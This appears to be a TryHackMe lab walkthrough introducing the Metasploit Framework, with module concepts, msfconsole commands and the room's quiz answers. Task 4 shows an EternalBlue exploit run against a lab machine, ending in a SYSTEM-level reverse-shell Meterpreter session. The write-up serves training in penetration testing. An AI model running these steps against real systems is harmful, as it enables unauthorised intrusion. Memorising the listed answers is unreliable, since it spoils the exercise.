---
icon: swords
cover: https://assets.tryhackme.com/room-banners/metasploit.png
coverY: 0
coverHeight: 138
---

# Metasploit: Introduction

**Date:** 26.03.2026

**Room Category:** Walkthrough / Exploitation Basics

**Core Concept:** An introduction to the main components of the Metasploit Framework, navigating `msfconsole`, configuring module parameters, and executing the famous MS17-010 (EternalBlue) exploit.

Metasploit is arguably the most widely used exploitation framework in the cybersecurity industry. It supports every phase of a penetration testing engagement, from initial information gathering to post-exploitation. This room serves as a foundational guide on how to interact with the framework's command-line interface.

***

## Task 1: Introduction to Metasploit

Metasploit comes in two primary flavors. **Metasploit Pro** is the commercial version that features a full Graphical User Interface (GUI) and facilitates task automation and management. The **Metasploit Framework** is the open-source version that operates primarily from the command line. In this lab, we will be using the open-source Framework.

Question: No answer needed

> **Answer:** No answer needed

***

## Task 2: Main Components of Metasploit

The framework is built on a modular architecture. Understanding these modules is critical to using Metasploit effectively:

* **Exploits:** The code that takes advantage of a vulnerability.
* **Payloads:** The code that runs _after_ the exploit successfully executes (e.g., a reverse shell).
* **Auxiliary:** Scanning, fuzzing, and discovery modules that don't execute payloads.
* **Encoders:** Used to obfuscate payloads to evade antivirus detection.
* **Post:** Modules run after gaining a session to gather further information or pivot.

Question: What is the name of the code taking advantage of a flaw on the target system?

> **Answer:** Exploit

Question: What is the name of the code that runs on the target system to achieve the attacker's goal?

> **Answer:** Payload

Question: What are self-contained payloads called?

> **Answer:** Singles

Question: Is "windows/x64/pingback\_reverse\_tcp" among singles or staged payload?

> **Answer:** Singles

***

## Task 3: Msfconsole

`msfconsole` is the primary command-line interface for the Metasploit Framework. It provides a centralized console to search for exploits, set parameters, and manage active sessions.

```bash
# Starting the Metasploit console natively
user@attackbox$ msfconsole

# Searching for the EternalBlue vulnerability
msf6 > search ms17_010

# Selecting a specific module to use
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Once a module is selected, the prompt changes to reflect your current context (e.g., `msf6 exploit(...) >`). From here, you use the `show options` command to see what parameters the exploit requires to function.

Question: How would you search for a module related to Apache?

> Answer: search apache

Question: Who provided the auxiliary/scanner/ssh/ssh\_login module?

> Answer: todb

***

## Task 4: Working with Modules

Once an exploit is selected, we must configure its parameters. Variables like the target IP (`RHOSTS`), local IP for the reverse shell (`LHOST`), and local port (`LPORT`) must be set correctly.

We can set variables for the current module using `set`, or globally across all modules using `setg`. If we make a mistake, we can clear the variable using `unset`.

#### Exploitation Snippet (EternalBlue)

Here is a concise look at setting up and launching the MS17-010 exploit against our target machine:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.48.174.246
RHOSTS => 10.48.174.246

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.12.229
LHOST => 10.10.12.229

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.12.229:4444 
[*] 10.48.174.246:445 - Connecting to target for exploitation.
[*] 10.48.174.246:445 - Executing the payload...
[*] Sending stage (200262 bytes) to 10.48.174.246
[*] Meterpreter session 1 opened (10.10.12.229:4444 -> 10.48.174.246:49186)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Question: How would you set the LPORT value to 6666?

> **Answer:** set LPORT 6666

Question: How would you set the global value for RHOSTS to 10.10.19.23?

> **Answer:** setg RHOSTS 10.10.19.23

Question: What command would you use to clear a set payload?

> **Answer:** unset PAYLOAD

Question: What command do you use to proceed with the exploitation phase?

> **Answer:** exploit

***

## Conclusion

The exploitation process in Metasploit comprises three main steps: **finding the exploit** (`search`), **customizing the exploit** (`set`), and **exploiting the vulnerable service** (`exploit` or `run`).

By successfully launching `ms17_010_eternalblue`, we bypassed standard authentication and gained a high-privileged `meterpreter` session on the target virtual machine, proving the effectiveness of the Metasploit framework.
